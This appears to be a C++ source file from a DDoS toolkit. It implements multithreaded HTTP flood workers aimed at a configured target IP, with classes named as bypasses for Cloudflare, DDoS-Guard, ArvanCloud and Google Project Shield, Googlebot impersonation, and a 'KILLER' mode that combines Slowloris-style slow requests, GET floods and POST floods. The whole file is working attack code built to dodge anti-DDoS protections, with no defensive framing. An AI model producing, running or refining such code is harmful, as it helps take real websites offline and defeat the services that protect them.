#include "l7_bypass.h"
#include <sstream>
#include <random>
#include <regex>
#include <algorithm>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #define close closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #define SOCKET int
    #define INVALID_SOCKET -1
#endif

namespace laitoxx {

static std::string random_string(size_t len) {
    static const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(chars) - 2);

    std::string result;
    for (size_t i = 0; i < len; ++i) {
        result += chars[dis(gen)];
    }
    return result;
}

// ============================================================================
// Cloudflare Bypass
// ============================================================================
void CloudflareBypass::start() {
    log("Starting Cloudflare bypass attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&CloudflareBypass::attack_worker, this);
    }
}

std::string CloudflareBypass::generate_cf_headers() {
    std::stringstream ss;
    ss << "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\r\n"
       << "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
       << "Accept-Language: en-US,en;q=0.5\r\n"
       << "Accept-Encoding: gzip, deflate\r\n"
       << "Connection: keep-alive\r\n"
       << "Upgrade-Insecure-Requests: 1\r\n"
       << "Sec-Fetch-Dest: document\r\n"
       << "Sec-Fetch-Mode: navigate\r\n"
       << "Sec-Fetch-Site: none\r\n"
       << "Cache-Control: max-age=0\r\n";
    return ss.str();
}

void CloudflareBypass::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream request;
            request << "GET / HTTP/1.1\r\n"
                   << "Host: " << config_.target_ip << "\r\n"
                   << generate_cf_headers()
                   << "\r\n";

            std::string req = request.str();
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    });
}

// ============================================================================
// Cloudflare UAM Bypass
// ============================================================================
void CloudflareUAM::start() {
    log("Starting Cloudflare UAM bypass");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&CloudflareUAM::attack_worker, this);
    }
}

bool CloudflareUAM::solve_js_challenge(const std::string& page_content, std::string& clearance_token) {
    // Simplified: Look for __cf_chl_jschl_tk__ value
    std::regex token_regex("name=\"jschl_vc\" value=\"([^\"]+)\"");
    std::smatch match;

    if (std::regex_search(page_content, match, token_regex) && match.size() > 1) {
        clearance_token = match[1].str();
        return true;
    }

    return false;
}

void CloudflareUAM::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            // First request — always counts as a packet
            std::stringstream req;
            req << "GET /" << random_string(6) << " HTTP/1.1\r\n"
                << "Host: " << config_.target_ip << "\r\n"
                << "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\r\n"
                << "Accept: text/html,application/xhtml+xml\r\n"
                << "Accept-Language: en-US,en;q=0.5\r\n"
                << "Upgrade-Insecure-Requests: 1\r\n"
                << "Cache-Control: no-cache\r\n"
                << "Connection: keep-alive\r\n\r\n";
            std::string req_str = req.str();
            send(sock, req_str.c_str(), req_str.length(), 0);
            packets_sent_++;

            // Try to read and solve challenge for bonus second request
            char buffer[4096];
            int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes > 0) {
                buffer[bytes] = '\0';
                std::string clearance;
                if (solve_js_challenge(std::string(buffer), clearance)) {
                    std::string req2 = "GET /?jschl_vc=" + clearance +
                        " HTTP/1.1\r\nHost: " + config_.target_ip + "\r\n\r\n";
                    send(sock, req2.c_str(), req2.length(), 0);
                    packets_sent_++;
                }
            }
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    });
}

// ============================================================================
// DDoS-Guard Bypass
// ============================================================================
void DDoSGuardBypass::start() {
    log("Starting DDoS-Guard bypass");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&DDoSGuardBypass::attack_worker, this);
    }
}

std::string DDoSGuardBypass::generate_ddg_headers() {
    std::stringstream ss;
    ss << "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n"
       << "Accept: text/html,application/xhtml+xml\r\n"
       << "Accept-Language: en-US,en;q=0.9\r\n"
       << "Cache-Control: no-cache\r\n"
       << "Pragma: no-cache\r\n";
    return ss.str();
}

void DDoSGuardBypass::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream request;
            request << "GET /" << random_string(8) << " HTTP/1.1\r\n"
                   << "Host: " << config_.target_ip << "\r\n"
                   << generate_ddg_headers()
                   << "\r\n";

            std::string req = request.str();
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    });
}

// ============================================================================
// ArvanCloud Bypass
// ============================================================================
void ArvanCloudBypass::start() {
    log("Starting ArvanCloud bypass");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&ArvanCloudBypass::attack_worker, this);
    }
}

void ArvanCloudBypass::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream request;
            request << "GET / HTTP/1.1\r\n"
                   << "Host: " << config_.target_ip << "\r\n"
                   << "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)\r\n"
                   << "Accept: */*\r\n"
                   << "Referer: https://www.google.com/\r\n"
                   << "\r\n";

            std::string req = request.str();
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
    });
}

// ============================================================================
// Google Bot Attack
// ============================================================================
void GoogleBotAttack::start() {
    log("Starting Google Bot impersonation attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&GoogleBotAttack::attack_worker, this);
    }
}

std::string GoogleBotAttack::get_googlebot_ua() {
    static const char* bots[] = {
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
    };
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, 2);
    return bots[dis(gen)];
}

void GoogleBotAttack::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream request;
            request << "GET / HTTP/1.1\r\n"
                   << "Host: " << config_.target_ip << "\r\n"
                   << "User-Agent: " << get_googlebot_ua() << "\r\n"
                   << "Accept: */*\r\n"
                   << "\r\n";

            std::string req = request.str();
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    });
}

// ============================================================================
// Google Project Shield Bypass
// ============================================================================
void GoogleShieldBypass::start() {
    log("Starting Google Project Shield bypass");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&GoogleShieldBypass::attack_worker, this);
    }
}

std::map<std::string, std::string> GoogleShieldBypass::generate_legitimate_patterns() {
    std::map<std::string, std::string> headers;
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    headers["Accept-Language"] = "en-US,en;q=0.9";
    headers["Referer"] = "https://www.google.com/";
    headers["DNT"] = "1";
    return headers;
}

void GoogleShieldBypass::attack_worker() {
    auto headers = generate_legitimate_patterns();

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream request;
            request << "GET / HTTP/1.1\r\n"
                   << "Host: " << config_.target_ip << "\r\n";

            for (const auto& [key, value] : headers) {
                request << key << ": " << value << "\r\n";
            }
            request << "\r\n";

            std::string req = request.str();
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(150));
    });
}

// ============================================================================
// BYPASS Combined
// ============================================================================
void BYPASSCombined::start() {
    log("Starting combined bypass attack");
    current_technique_ = 0;

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&BYPASSCombined::attack_worker, this);
    }
}

void BYPASSCombined::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::stringstream request;

            // Rotate techniques
            int technique = (current_technique_++) % 4;

            switch (technique) {
                case 0: // Normal GET
                    request << "GET / HTTP/1.1\r\n";
                    break;
                case 1: // Random path
                    request << "GET /" << random_string(16) << " HTTP/1.1\r\n";
                    break;
                case 2: // POST
                    request << "POST / HTTP/1.1\r\nContent-Length: 0\r\n";
                    break;
                case 3: // HEAD
                    request << "HEAD / HTTP/1.1\r\n";
                    break;
            }

            request << "Host: " << config_.target_ip << "\r\n"
                   << "User-Agent: Mozilla/5.0 (compatible)\r\n"
                   << "\r\n";

            std::string req = request.str();
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    });
}

// ============================================================================
// KILLER Attack
// ============================================================================
void KILLERAttack::start() {
    log("Starting KILLER multi-method attack");

    // Distribute threads across methods (at least 1 per method)
    int threads_per_method = std::max(1, config_.thread_count / 3);

    for (int i = 0; i < threads_per_method; ++i) {
        threads_.emplace_back(&KILLERAttack::slow_worker, this);
        threads_.emplace_back(&KILLERAttack::fast_worker, this);
        threads_.emplace_back(&KILLERAttack::post_worker, this);
    }
}

void KILLERAttack::slow_worker() {
    // Slow requests (Slowloris-style)
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::string base = "GET / HTTP/1.1\r\n";
            send(sock, base.c_str(), base.length(), 0);

            for (int i = 0; i < 5 && !stop_flag_; ++i) {
                std::string header = "X-" + random_string(8) + ": 1\r\n";
                send(sock, header.c_str(), header.length(), 0);
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            }
            packets_sent_++;
        }

        close(sock);
    });
}

void KILLERAttack::fast_worker() {
    // Fast GET flood
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::string req = "GET / HTTP/1.1\r\nHost: " + config_.target_ip + "\r\n\r\n";
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    });
}

void KILLERAttack::post_worker() {
    // POST with body
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::string body = "{\"data\":\"" + random_string(256) + "\"}";
            std::stringstream ss;
            ss << "POST / HTTP/1.1\r\n"
               << "Host: " << config_.target_ip << "\r\n"
               << "Content-Type: application/json\r\n"
               << "Content-Length: " << body.length() << "\r\n\r\n"
               << body;

            std::string req = ss.str();
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    });
}

} // namespace laitoxx
